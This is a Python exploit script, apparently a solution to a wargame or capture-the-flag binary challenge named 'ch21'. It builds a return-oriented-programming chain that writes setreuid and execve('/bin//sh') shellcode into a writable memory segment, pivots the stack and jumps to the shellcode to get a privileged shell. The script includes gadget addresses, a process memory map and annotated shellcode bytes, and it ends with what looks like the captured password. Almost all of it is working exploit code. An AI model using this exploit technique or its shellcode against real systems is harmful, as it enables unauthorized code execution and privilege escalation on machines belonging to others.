

base_addr = str(int(0x0804a000)) + '\x00'*10

#0x080484a6: pop eax; pop ebx; leave; ret;
POP_EAX_EBX = str(int(0x080484a6)) + '\x00' * 10

#0x080484fe: add dword ptr [ebx + 0x5d5b04c4], eax; ret;
ADD_PRT_EBX_EAX = str(int(0x080484fe)) + '\x00' * 10

#0x08048502, pop ebx, pop ebp, ret;
POP_EBX_EBP = str(int(0x08048502)) + '\x00' * 10



"""
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-x /home/jackryan/edb-debugger/build/ch21
0x08049000 0x0804a000 0x00000000 r-x /home/jackryan/edb-debugger/build/ch21
0x0804a000 0x0804b000 0x00001000 rwx /home/jackryan/edb-debugger/build/ch21
0xf7da8000 0xf7f58000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7f58000 0xf7f5a000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so
0xf7f5a000 0xf7f5b000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so
0xf7f5b000 0xf7f5e000 0x00000000 rwx 
0xf7f83000 0xf7f86000 0x00000000 r-- [vvar]
0xf7f86000 0xf7f88000 0x00000000 r-x [vdso]
0xf7f88000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7fab000 0xf7fac000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so
0xf7fac000 0xf7fad000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so
0xf7faf000 0xf7fb1000 0x00000000 rwx 
0xffaba000 0xffadb000 0x00000000 rwx [stack]
	

	euid = 1221
	\x6a\x46				// push	0x46 (sys_setreuid)	
	\x58					// pop	%eax
	\xbb\xc5\x04\x00\x00			// mov ebx, 1221
	\xb9\xc5\x04\x00\x00			// mov ecx, 1221
	\xcd\x80				// int	$0x80

	\x31\xd2				// xor	%edx, %edx
	\x6a\x0b				// push	$0xb
	\x58					// pop	%eax
	\x52					// push	%edx
	\x68\x2f\x2f\x73\x68			// push	$0x68732f2f
	\x68\x2f\x62\x69\x6e			// push	$0x6e69622f
	\x89\xe3				// mov	%esp, %ebx
	\x52					// push	%edx
	\x53					// push	%ebx
	\x89\xe1				// mov	%esp, %ecx
	\xcd\x80				// int	$0x80
"""

with open('input', 'wb') as f:

	#overwrite return address
	payload = ''
	payload +=  POP_EBX_EBP
	payload += '1033' + '\x00' * 15
	#after that we change ebp so when execute leave we have changed stack frame
	
	"""
	fff1:82fc|08048502|....| <-- ret to first gadget
	fff1:8300|00000002|....| <-- pop ebx
	fff1:8304|fff18394|....| <-- pop ebp (new stack frame)
	fff1:8308|08048502|....| <-- ret to second gadget
	fff1:830c|ffffffff|....| <-- pop eax
	fff1:8310|ffffffff|....| <-- pop ebx
	"""
	#after leave stack change so ret is upper in the stack

	#now ebp is not null so we can use that gadget 
	payload += POP_EAX_EBX
	payload += '1036' + '\x00' * 15

	"""
	pop eax
	write and intermetiate gadget as a pivot like that on 0x0804a000 to avoid use default gadgets
		\x58  pop eax
		\x5b  pop ebx
		\xc3  ret
		\x90  nop
	"""

	shellcode = str(int(0x90c35b58)) + '\x00' * 9
	payload += shellcode
	payload += '1037' + '\x00' * 15

	#pop ebx
	fixed_addr = str(0xffffffff - abs(0x0804a000-0x5d5b04c4) + 1)
	payload += fixed_addr + '\x00' * 9
	payload += '1038' + '\x00' * 15

	#we execute leave so esp has changed
	#ret must be on new stack frame
	# 1033 + 38 + 1 --> new esp
	#ret
	payload += ADD_PRT_EBX_EAX
	payload += '1072' + '\x00' * 15


	"""
	now we are going to write the shellcode
	
	\x6a\x46				// push	0x46 (sys_setreuid)	
	\x58					// pop	%eax
	\xbb\xc5\x04\x00\x00			// mov ebx, 1221
	"""
	payload += base_addr
	payload += '1073' + '\x00' * 15
	#pop eax
	shellcode = str(int(0xbb58466a)) + '\x00' * 9
	payload += shellcode
	payload += '1074' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 4 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1075' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1076' + '\x00' * 15


	"""
	\xbb\xc5\x04\x00\x00			// mov ebx, 1221
	"""
	payload += base_addr
	payload += '1077' + '\x00' * 15
	#pop eax	
	shellcode = str(int(0x000004c5)) + '\x00' * 15
	payload += shellcode
	payload += '1078' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 8 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1079' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1080' + '\x00' * 15



	"""
	\xb9\xc5\x04\x00\x00			// mov ecx, 1221
	"""	
	payload += base_addr
	payload += '1081' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x0004c5b9)) + '\x00' * 13
	payload += shellcode
	payload += '1082' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 12 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1083' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1084' + '\x00' * 15


	"""
	\xb9\xc5\x04\x00\x00			// mov ecx, 1221
	\xcd\x80				// int	$0x80
	\x90					// nop
	"""
	payload += base_addr
	payload += '1085' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x9080cd00)) + '\x00' * 9
	payload += shellcode
	payload += '1086' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 16 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1087' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1088' + '\x00' * 15


	"""
	\x31\xd2				// xor	%edx, %edx
	\x90					// nop
	\x6a\x0b				// push	$0xb
	"""
	payload += base_addr
	payload += '1089' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x6a90d231)) + '\x00' * 9
	payload += shellcode
	payload += '1090' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 20 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1091' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1092' + '\x00' * 15


	"""
	\x6a\x0b				// push	$0xb
  	\x58					// pop	%eax
  	\x52					// push	%edx
  	\x68\x2f\x2f\x73\x68			// push	$0x68732f2f
	"""
	payload += base_addr
	payload += '1093' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x6852580b)) + '\x00' * 9
	payload += shellcode
	payload += '1094' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 24 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1095' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1096' + '\x00' * 15


	"""
	\x68\x2f\x2f\x73\x68			// push	$0x68732f2f
	"""
	payload += base_addr
	payload += '1097' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x68732f2f)) + '\x00' * 9
	payload += shellcode
	payload += '1098' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 28 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1099' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1100' + '\x00' * 15

	"""
	\x68\x2f\x62\x69\x6e			// push	$0x6e69622f
	"""
	payload += base_addr
	payload += '1101' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x69622f68)) + '\x00' * 9
	payload += shellcode
	payload += '1102' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 32 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1103' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1104' + '\x00' * 15


	"""
	\x68\x2f\x62\x69\x6e			// push	$0x6e69622f
	\x89\xe3				// mov	%esp, %ebx
	\x52					// push	%edx
	"""
	payload += base_addr
	payload += '1105' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x52e3896e)) + '\x00' * 9
	payload += shellcode
	payload += '1106' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 36 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1107' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1108' + '\x00' * 15


	"""
	\x53					// push	%ebx
	\x89\xe1				// mov	%esp, %ecx
	\xcd\x80				// int	$0x80
	"""
	payload += base_addr
	payload += '1109' + '\x00' * 15
	#pop eax
	shellcode = str(int(0xcde18953)) + '\x00' * 9
	payload += shellcode
	payload += '1110' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 40 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1111' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1112' + '\x00' * 15
	
	
	"""
	\xcd\x80				// int	$0x80
	"""
	payload += base_addr
	payload += '1113' + '\x00' * 15
	#pop eax
	shellcode = str(int(0x90909080)) + '\x00' * 9
	payload += shellcode
	payload += '1114' + '\x00' * 15
	#pop ebx
	payload += str(0xffffffff - abs(0x0804a000 + 44 - 0x5d5b04c4) + 1) + '\x00' * 9
	payload += '1115' + '\x00' * 15

	payload += ADD_PRT_EBX_EAX
	payload += '1116' + '\x00' * 15


	#ret to shellcode
	payload += str(0x0804a000 + 4) + '\x00' * 10
	payload += '1117' + '\x00' * 15

	f.write(payload)


"""
OMFGwhostheWooWoo
"""
